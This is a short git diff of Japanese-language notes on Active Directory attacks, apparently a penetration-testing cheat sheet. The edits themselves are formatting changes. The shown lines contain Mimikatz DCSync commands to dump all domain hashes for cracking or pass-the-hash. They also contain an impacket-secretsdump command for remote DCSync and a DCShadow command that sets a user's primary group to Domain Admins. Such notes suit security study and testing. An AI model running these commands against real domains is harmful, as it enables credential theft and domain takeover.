@@ -496,9 +496,9 @@ lsadump::dcsync /domain:<domain> /user:<target username(krbtgtなど)>
 log <filename>.txt
 lsadump::dcsync /domain:<domain> /all
 ```
-→すべてのユーザー名・ハッシュがMimikatzのLogファイルに記入されるため、パスワードクラッキングもしくはPtH攻撃につなげる
+- →すべてのユーザー名・ハッシュがMimikatzのLogファイルに記入されるため、パスワードクラッキングもしくはPtH攻撃につなげる
 
-💡補足：攻撃者マシン上でリモートからのDCSync攻撃
+補足：攻撃者マシン上でリモートからのDCSync攻撃
 ```zsh
 impacket-secretsdump -just-dc-user <target username(krbtgtなど)> <domain>/<Domain/Enterprise Admins or Administratorグループのユーザー>:'<pw>'@<DC_IP>
 ```
@@ -511,10 +511,11 @@ impacket-secretsdump -just-dc-user <target username(krbtgtなど)> <domain>/<Dom
 
 1. Domain Admins、Enterprise Admins、DCのローカルAdministrators、Domain Controllersグループのいずれかのユーザーの権限を取得（一番難しい）
 	- これらのグループがデフォルトでドメインレプリケーションの権限をもつ
+
 2. 改ざんするためのデータを用意
 	- 🚨`token::elevate`は使用しない
 ```powershell
-lsadump::dcshadow /object:[ObjectのDN(例：CN=victim,CN=Users,DC=LAB,DC=local)] /attribute:primaryGroupID /value:512
+lsadump::dcshadow /object:<ObjectのDN> /attribute:primaryGroupID /value:512
 ```
 - primaryGroupID：オブジェクトのグループID
 - 512: Domain Adminsグループ
